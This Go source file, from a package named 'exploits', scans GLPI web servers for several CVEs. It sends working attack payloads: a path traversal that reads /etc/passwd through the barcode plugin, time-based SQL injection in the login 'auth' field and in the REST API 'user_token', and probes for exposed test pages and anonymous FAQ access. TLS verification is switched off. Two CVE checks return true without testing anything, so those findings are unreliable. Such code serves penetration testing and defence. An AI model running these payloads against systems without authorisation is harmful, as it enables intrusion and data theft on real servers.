package exploits

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
)

func CheckIsGLPI(target string) bool {

	response := MakeRequest(target, false)
	body := response.(string)

	m, err := regexp.MatchString("<title>GLPI", body)
	if err != nil {
		fmt.Println("Unable to check if this is a GLPI")
		return false
	}
	n, err := regexp.MatchString("GLPI</title>", body)
	if err != nil {
		fmt.Println("Unable to check if this is a GLPI")
		return false
	}

	if m || n {
		return true
	} else {
		return false
	}
}

func CheckCVE202015175(target string) bool {

	var checkpayload = "/front/pluginimage.send.php?plugin=..&name=.xxx&clean"

	if CheckIsGLPI(target) {

		response := MakeRequest(target+checkpayload, false)
		body := response.(string)
		if body == "security" {
			return false
		} else {
			//fmt.Println("Target is Vulnerable !")
			return true
		}
	} else {
		fmt.Println("Target is not a GLPI. Exiting....")
		os.Exit(1)
	}
	return false
}

func CheckCVE202231061(target string) bool {
	if CheckCVE202231061LDAP(target) {
		var data string
		var field = GetField(target)
		authPayload := url.QueryEscape("ldap-1' UNION SELECT sleep(5) #")

		if CSRF {
			data = fmt.Sprintf("noAUTO=1&%s=User&%s=Password&auth=%s&%s=on&submit=&_glpi_csrf_token=%s", field.LOGIN, field.PASS, authPayload, field.REME, field.CSRF)
		} else {
			data = fmt.Sprintf("noAUTO=1&%s=User&%s=Password&auth=%s&%s=on&submit=", field.LOGIN, field.PASS, authPayload, field.REME)
		}

		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
			Timeout: 10 * time.Second,
		}

		req, err := http.NewRequest("POST", target+"/front/login.php", bytes.NewBufferString(data))
		if err != nil {
			fmt.Println(err)
		}

		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
		req.Header.Add("Referer", target+"/index.php")
		req.Header.Add("Cookie", field.COOK)

		start := time.Now()

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(err)
		}
		defer resp.Body.Close()

		elapsed := time.Since(start)

		if elapsed.Seconds() > 5 {
			//fmt.Println("Target is Vulnerable !")
			return true
		}
	}
	return false
}

func CheckCVE202265914(target string) bool {
	if CheckIsGLPI(target) {
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}

		resp, err := client.Get(target + "/vendor/htmlawed/htmlawed/htmLawedTest.php")
		if err != nil {
			fmt.Println("Target is not Vulnerable !")
			return false
		}
		if resp.StatusCode != 200 {

			return false
		}
		//fmt.Println("Target is Vulnerable !")
		defer resp.Body.Close()
		return resp.StatusCode == http.StatusOK

	} else {
		fmt.Println("Target is not a GLPI. Exiting....")
		os.Exit(1)
	}
	return false
}

func CheckCVE202143778(target string) bool {
	if CheckIsGLPI(target) {
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
		res, err := client.Get(target + "/plugins/barcode/front/send.php?file=../../../../../../../../../../../../etc/passwd")
		if err != nil {
			fmt.Println("Error while fetching the URL:", err)

		}
		defer res.Body.Close()

		body, err := io.ReadAll(res.Body)
		if err != nil {
			fmt.Println("Error while reading the response:", err)
		}
		if res.StatusCode == 200 && string(body) == "Security attack !!!" {
			return false

		} else if res.StatusCode == 200 {
			//fmt.Print("Target is Vulnerable !\n\n")
			return true
		}
	} else {
		fmt.Println("Target is not a GLPI. Exiting....")
		os.Exit(1)

	}
	return false
}

func CheckCVE202239323(target string) bool {
	if CheckIsGLPI(target) {

		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
			Timeout: 10 * time.Second,
		}

		start := time.Now()
		response, err := client.Get(target + "/apirest.php/initSession?user_token='OR%20(SELECT%20*%20FROM%20(SELECT(SLEEP(3)))a)%20AND%20'd26'%20=%20'd26")

		if err != nil {
			return true
		}
		defer response.Body.Close()

		elapsed := time.Since(start)

		return elapsed.Seconds() > 3
	} else {
		fmt.Println("Target is not a GLPI. Exiting....")
		os.Exit(1)
	}
	return false
}
func CheckCVE20205248(target string) bool {
	return true
}
func CheckCVE202015176(target string) bool {

	return true
}

func CheckCVE202322500(target string) bool {

	if CheckIsGLPI(target) {

		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

		res, err := client.Get(target + "/front/helpdesk.faq.php")
		if err != nil {
			panic(err)
		}
		fmt.Println()
		if res.StatusCode == 200 {
			//fmt.Println("Anonymous Access to FAQ is enable !")
			return true
		} else {
			return false
		}
	} else {
		fmt.Println("Target is not a GLPI. Exiting....")
		os.Exit(1)
	}
	return false
}

func CheckCVE202231061LDAP(target string) bool {
	if CheckIsGLPI(target) {
		var exists bool
		res, err := http.Get(target)
		if err != nil {
			log.Fatal(err)
		}
		defer res.Body.Close()

		if res.StatusCode != 200 {
			log.Fatalf("status code error: %d %s", res.StatusCode, res.Status)
		}

		doc, err := goquery.NewDocumentFromReader(res.Body)
		if err != nil {
			log.Fatal(err)
		}

		authField := []string{}
		doc.Find("select[name='auth'] option").Each(func(i int, s *goquery.Selection) {
			value, _ := s.Attr("value")
			authField = append(authField, value)
		})

		reqField.CSRF, exists = doc.Find("input[name='_glpi_csrf_token']").Attr("value")
		if !exists {
			fmt.Println("CSRF token not found, the exploit will maybe fail :'(")
			CSRF = false
		}

		for _, val := range authField {
			if strings.Contains(val, "ldap") {
				//fmt.Println("LDAP is enabled !")

				return true
			} else if val == "" {
				return false
			}
		}
		return false

	} else {
		fmt.Println("Target is not a GLPI. Exiting....")
		os.Exit(1)
	}
	return false
}
